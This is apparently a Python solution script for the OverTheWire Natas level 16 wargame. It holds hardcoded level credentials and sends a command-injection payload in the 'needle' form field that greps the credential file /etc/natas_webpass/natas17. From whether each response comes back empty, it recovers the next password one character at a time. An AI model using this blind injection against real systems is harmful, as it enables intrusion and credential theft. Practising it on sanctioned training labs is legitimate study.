from bs4 import BeautifulSoup as bs
import urllib
import base64
import binascii
import requests
import re
from string import *
import sys

u='natas16'
p='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
l=f'http://{u}.natas.labs.overthewire.org/'

C=ascii_lowercase+ascii_uppercase+digits
mypwd=[]
while len(mypwd)<len(p):
    for c in C:
        print(''.join(mypwd)+c)
        needle='watchdogs$(grep ^'+''.join(mypwd)+c+' /etc/natas_webpass/natas17)'
        resp=requests.post(l,auth=(u, p),data={'needle':needle})
        if not re.findall('<pre>\n(.*)\n</pre>',resp.text):
            mypwd+=c,
            break
print(''.join(mypwd))
